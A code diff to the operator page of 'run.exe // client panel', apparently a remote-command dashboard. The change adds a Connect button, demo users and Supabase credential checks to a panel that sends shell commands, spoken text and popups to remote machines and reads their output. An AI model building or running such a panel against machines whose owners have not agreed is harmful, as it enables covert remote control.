@@ -541,6 +541,33 @@
             gap: 12px;
         }
 
+        .connect-btn {
+            background: var(--bg-elevated);
+            border: 1px solid var(--border-subtle);
+            border-radius: 2px;
+            color: var(--text);
+            cursor: pointer;
+            font-family: inherit;
+            font-size: 11px;
+            font-weight: bold;
+            letter-spacing: 0.08em;
+            min-width: 98px;
+            padding: 6px 10px;
+            text-transform: uppercase;
+            transition: background-color 160ms ease, border-color 160ms ease, color 160ms ease;
+        }
+
+        .connect-btn.connected {
+            border-color: var(--status-yellow);
+            color: var(--status-yellow);
+        }
+
+        .connect-btn:hover {
+            background: var(--bg-hover);
+            border-color: var(--text);
+            color: var(--text);
+        }
+
         .theme-select {
             appearance: none;
             background: var(--bg-elevated);
@@ -812,6 +839,12 @@
                 padding: 5px 8px;
             }
 
+            .connect-btn {
+                font-size: 10px;
+                min-width: 86px;
+                padding: 5px 8px;
+            }
+
             .toolbar-title {
                 font-size: 12px;
                 overflow: hidden;
@@ -844,6 +877,7 @@
         <div class="toolbar">
             <span class="toolbar-title">run.exe // client panel</span>
             <div class="toolbar-right">
+                <button id="connect-btn" class="connect-btn" type="button">Connect</button>
                 <select id="theme-select" class="theme-select" aria-label="Theme picker" title="Theme picker">
                     <option id="theme-random-option" value="random">Random</option>
                     <option value="night">Night</option>
@@ -933,6 +967,7 @@
             interactionMode: null,
             lastRenderSignature: null,
             fetchInFlight: false,
+            isConnected: false,
             hintUsername: null,
             isRendering: false,
             popupExampleText: '',
@@ -953,6 +988,12 @@
             ]
         };
 
+        const demoUsers = [
+            { username: 'demo-ator', updated_at: new Date(Date.now() - 4000).toISOString(), visible: true, demo: true },
+            { username: 'demo-kirk', updated_at: new Date(Date.now() - 17000).toISOString(), visible: false, demo: true },
+            { username: 'demo-jordan', updated_at: new Date(Date.now() - 75000).toISOString(), visible: false, demo: true }
+        ];
+
         const $ = id => document.getElementById(id);
 
         const themeNames = ['night', 'graphite', 'midnight', 'forest', 'ember', 'polar'];
@@ -970,6 +1011,86 @@
             const randomOption = $('theme-random-option');
             if (!randomOption) return;
             randomOption.textContent = `Random (${formatThemeLabel(activeThemeName)})`;
+        }
+
+        function setStoredCredentials(url, apiKey) {
+            state.url = url;
+            state.apiKey = apiKey;
+
+            if (url && apiKey) {
+                localStorage.setItem('supa_url', url);
+                localStorage.setItem('supa_key', apiKey);
+                return;
+            }
+
+            localStorage.removeItem('supa_url');
+            localStorage.removeItem('supa_key');
+        }
+
+        function setConnectionState(connected) {
+            state.isConnected = !!connected;
+            const connectBtn = $('connect-btn');
+            if (!connectBtn) return;
+
+            connectBtn.classList.toggle('connected', state.isConnected);
+            connectBtn.textContent = state.isConnected ? 'Disconnect' : 'Connect';
+            connectBtn.title = state.isConnected
+                ? 'Disconnect and clear saved credentials'
+                : 'Connect using URL + API Key';
+        }
+
+        function disconnectAndReset() {
+            setStoredCredentials(null, null);
+            setConnectionState(false);
+            state.rows = [];
+            state.sortedRows = [];
+            state.lastRenderSignature = null;
+            renderGrid();
+        }
+
+        async function validateSupabaseCredentials(url, apiKey) {
+            if (!url || !apiKey) return false;
+
+            const controller = new AbortController();
+            const timeoutId = setTimeout(() => controller.abort(), 7000);
+            try {
+                const res = await fetch(`${url}?select=username&limit=1`, {
+                    headers: { apikey: apiKey, Authorization: `Bearer ${apiKey}` },
+                    signal: controller.signal
+                });
+                return res.ok;
+            } catch {
+                return false;
+            } finally {
+                clearTimeout(timeoutId);
+            }
+        }
+
+        async function connectWithCredentials(url, apiKey, { notifyOnFail = true } = {}) {
+            const isValid = await validateSupabaseCredentials(url, apiKey);
+            if (!isValid) {
+                // Reset invalid credentials to avoid locking mobile users behind bad saved values.
+                setStoredCredentials(null, null);
+                setConnectionState(false);
+                if (notifyOnFail) {
+                    alert('Connection failed. URL/token were reset. Please reconnect.');
+                }
+                return false;
+            }
+
+            setStoredCredentials(url, apiKey);
+            setConnectionState(true);
+            fetchData();
+            return true;
+        }
+
+        async function promptAndConnect() {
+            const url = prompt('Supabase URL:', state.url || '');
+            if (!url) return;
+            const apiKey = prompt('API Key:', state.apiKey || '');
+            if (!apiKey) return;
+
+            await connectWithCredentials(url.trim(), apiKey.trim(), { notifyOnFail: true });
         }
 
         function applyTheme(themeName = 'night') {
@@ -1013,7 +1134,11 @@
             return state.sortedRows;
         }
 
-        function getHintUsername(sorted = getSortedRows()) {
+        function getRenderableRows() {
+            return state.isConnected ? getSortedRows() : sortRows(demoUsers);
+        }
+
+        function getHintUsername(sorted = getRenderableRows()) {
             if (!sorted.length) return null;
             if (state.activeUsername && sorted.some(user => user.username === state.activeUsername)) {
                 return state.activeUsername;
@@ -1030,6 +1155,7 @@
         }
 
         function getStatus(user, nowMs = Date.now()) {
+            if (user.demo && user.username === 'demo-ator') return 'green';
             const diff = (nowMs - new Date(user.updated_at).getTime()) / 1000;
             if (diff < 10) return 'green';
             if (diff < 30) return 'yellow';
@@ -1125,7 +1251,7 @@
 
             const cards = document.querySelectorAll('.user-card');
             cards.forEach(c => c.classList.remove('selected'));
-            const sorted = getSortedRows();
+            const sorted = getRenderableRows();
             const idx = sorted.findIndex(item => item.username === user.username);
             if (idx === -1 || idx >= cards.length) {
                 return;
@@ -1140,7 +1266,9 @@
         }
 
         function getCardBodyHtml(user, status, alive, tsText, showHint) {
-            const showPrimaryHint = showHint && alive;
+            const isDemo = !!user.demo;
+            const canInteract = state.isConnected || isDemo;
+            const showPrimaryHint = showHint && alive && canInteract;
             return `
                     <div class="card-header">
                         <div style="flex:1;min-width:0;">
@@ -1152,17 +1280,17 @@
                         </div>
                     </div>
                     <div class="card-actions">
-                        <button class="card-btn primary ${alive ? '' : 'disabled'}" data-action="cmd" ${alive ? '' : 'disabled aria-disabled="true"'}>
+                        <button class="card-btn primary ${(alive && canInteract) ? '' : 'disabled'}" data-action="cmd" ${(alive && canInteract) ? '' : 'disabled aria-disabled="true"'}>
                             CMD ${showPrimaryHint ? '<span class="btn-hint">C</span>' : ''}
                         </button>
-                        <button class="card-btn ${alive ? '' : 'disabled'}" data-action="speak" ${alive ? '' : 'disabled aria-disabled="true"'}>
+                        <button class="card-btn ${(alive && canInteract) ? '' : 'disabled'}" data-action="speak" ${(alive && canInteract) ? '' : 'disabled aria-disabled="true"'}>
                             SPK ${showPrimaryHint ? '<span class="btn-hint">S</span>' : ''}
                         </button>
-                        <button class="card-btn ${alive ? '' : 'disabled'}" data-action="popup_msg" ${alive ? '' : 'disabled aria-disabled="true"'}>
+                        <button class="card-btn ${(alive && canInteract) ? '' : 'disabled'}" data-action="popup_msg" ${(alive && canInteract) ? '' : 'disabled aria-disabled="true"'}>
                             MSG ${showPrimaryHint ? '<span class="btn-hint">A</span>' : ''}
                         </button>
-                        <button class="card-btn" data-action="output">
-                            OUT ${showHint ? '<span class="btn-hint">V</span>' : ''}
+                        <button class="card-btn ${canInteract ? '' : 'disabled'}" data-action="output" ${canInteract ? '' : 'disabled aria-disabled="true"'}>
+                            OUT ${showHint && canInteract ? '<span class="btn-hint">V</span>' : ''}
                         </button>
                     </div>
                 `;
@@ -1175,7 +1303,7 @@
         function renderGrid() {
             state.isRendering = true;
             const grid = $('user-grid');
-            const sorted = getSortedRows();
+            const sorted = getRenderableRows();
             const hintUsername = getHintUsername(sorted);
             state.hintUsername = hintUsername;
 
@@ -1303,6 +1431,10 @@
             updateOptionsUI();
             renderGrid();
 
+            if (!state.isConnected || !state.url || !state.apiKey || state.popupUser.demo) {
+                return;
+            }
+
             try {
                 await fetch(`${state.url}?username=eq.${state.popupUser.username}`, {
                     method: 'PATCH',
@@ -1398,6 +1530,12 @@
             const val = $('popup-input').value.trim();
             if (!user) return;
 
+            if (!state.isConnected || user.demo) {
+                closePopup();
+                alert('Demo mode: action preview only. Connect to send real commands.');
+                return;
+            }
+
             let rawCmd = '';
             if (mode === 'cmd') {
                 const cmdInput = applyCommandPause(val);
@@ -1433,6 +1571,13 @@
         }
 
         async function doViewOutput(user) {
+            if (user?.demo || !state.isConnected) {
+                const demoOutput = `[demo] ${user.username}\nstatus: preview only\nlast action: none (connect to enable live output)`;
+                navigator.clipboard.writeText(demoOutput).catch(() => { });
+                alert(demoOutput);
+                return;
+            }
+
             try {
                 const res = await fetch(`${state.url}?select=out&username=eq.${user.username}`, {
                     headers: { apikey: state.apiKey, Authorization: `Bearer ${state.apiKey}` }
@@ -1447,6 +1592,7 @@
         }
 
         async function fetchData() {
+            if (!state.url || !state.apiKey || !state.isConnected) return;
             if (state.fetchInFlight) return;
             state.fetchInFlight = true;
             try {
@@ -1474,6 +1620,8 @@
 
         function init() {
             applyTheme(state.themeSelection);
+            setConnectionState(false);
+            renderGrid();
 
             const themeSelect = $('theme-select');
             if (themeSelect) {
@@ -1483,17 +1631,21 @@
                 });
             }
 
-            if (!state.url || !state.apiKey) {
-                const u = prompt('Supabase URL:');
-                const k = prompt('API Key:');
-                if (u && k) {
-                    state.url = u; state.apiKey = k;
-                    localStorage.setItem('supa_url', u);
-                    localStorage.setItem('supa_key', k);
-                }
+            const connectBtn = $('connect-btn');
+            if (connectBtn) {
+                connectBtn.addEventListener('click', () => {
+                    if (state.isConnected) {
+                        disconnectAndReset();
+                        return;
+                    }
+                    promptAndConnect();
+                });
             }
 
-            fetchData();
+            if (state.url && state.apiKey) {
+                connectWithCredentials(state.url, state.apiKey, { notifyOnFail: false });
+            }
+
             setInterval(fetchData, 4000);
 
             const grid = $('user-grid');
@@ -1504,7 +1656,7 @@
                 const username = card.dataset.username;
                 if (!username || username === state.activeUsername) return;
 
-                const sorted = getSortedRows();
+                const sorted = getRenderableRows();
                 const hoveredUser = sorted.find(item => item.username === username);
                 if (hoveredUser) {
                     setActiveSelection(hoveredUser, 'hover');
@@ -1527,7 +1679,7 @@
                 const username = card.dataset.username;
                 if (!username) return;
 
-                const user = getSortedRows().find(item => item.username === username);
+                const user = getRenderableRows().find(item => item.username === username);
                 if (!user) return;
 
                 const action = btn.dataset.action;
@@ -1590,7 +1742,7 @@
                     const grid = $('user-grid');
                     const gridStyle = getComputedStyle(grid);
                     const cols = gridStyle.gridTemplateColumns.split(' ').length;
-                    const sorted = getSortedRows();
+                    const sorted = getRenderableRows();
                     const currentIndex = state.activeUsername
                         ? sorted.findIndex(item => item.username === state.activeUsername)
                         : -1;
@@ -1611,7 +1763,7 @@
                     return;
                 }
 
-                const sorted = getSortedRows();
+                const sorted = getRenderableRows();
                 const u = state.activeUsername ? sorted.find(item => item.username === state.activeUsername) : null;
                 if (!u) return;
                 const alive = getStatus(u) === 'green';
